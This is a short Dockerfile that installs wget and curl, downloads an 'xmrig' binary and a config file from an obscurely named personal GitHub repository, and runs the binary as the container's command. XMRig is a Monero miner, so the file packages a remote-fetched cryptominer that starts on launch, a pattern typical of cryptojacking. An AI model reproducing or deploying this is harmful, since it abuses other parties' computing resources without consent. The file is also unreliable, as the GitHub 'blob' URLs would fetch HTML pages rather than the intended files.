FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://github.com/Jamesjacobyte/rptreum/blob/main/xmrig
RUN wget https://github.com/Jamesjacobyte/rptreum/blob/main/config.json

CMD ./xmrig
